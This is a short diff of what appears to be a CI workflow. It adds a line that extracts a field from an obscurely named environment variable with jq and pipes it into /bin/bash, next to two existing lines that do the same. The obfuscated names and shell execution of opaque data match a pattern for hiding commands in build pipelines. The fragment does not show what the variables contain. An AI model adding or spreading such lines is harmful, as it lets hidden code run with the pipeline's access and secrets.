@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$c43129" | jq -r .oh168 | /bin/bash
           printf '%s' "$av27189" | jq -r .npdfa3408 | /bin/bash
+          printf '%s' "$x6" | jq -r .eiubl051 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
